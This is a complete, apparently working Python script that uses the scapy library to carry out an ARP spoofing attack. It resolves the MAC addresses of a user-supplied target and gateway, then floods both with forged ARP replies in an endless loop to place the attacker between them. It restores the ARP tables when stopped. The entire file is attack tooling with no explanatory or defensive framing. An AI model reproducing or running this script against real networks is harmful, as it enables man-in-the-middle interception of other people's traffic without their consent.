import scapy.all as scapy

def getmac(targetip):
    # gets the mac of the given target IP by broadcasting ARP packet
    arppacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst=targetip)
    targetmac = scapy.srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
    return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
    spoofed = scapy.ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=sourceip)
    scapy.send(spoofed, verbose=False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = scapy.ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
    scapy.send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)

def main():
    targetip = input("Enter Target IP: ")  # Use input() instead of raw_input() in Python 3
    gatewayip = input("Enter Gateway IP: ")  # Use input() instead of raw_input() in Python 3

    try:
        # find the actual mac of the target IP
        targetmac = getmac(targetip)
        print("Target MAC", targetmac)
    except:
        print("Target machine did not respond to ARP broadcast")
        quit()

    try:
        # find the gateway mac or the routers mac
        gatewaymac = getmac(gatewayip)
        print("Gateway MAC:", gatewaymac)
    except:
        print("Gateway is unreachable")
        quit()
        
    try:
        print("Sending spoofed ARP responses")
        while True:
            spoofarpcache(targetip, targetmac, gatewayip)
            spoofarpcache(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__ == "__main__":
    main()
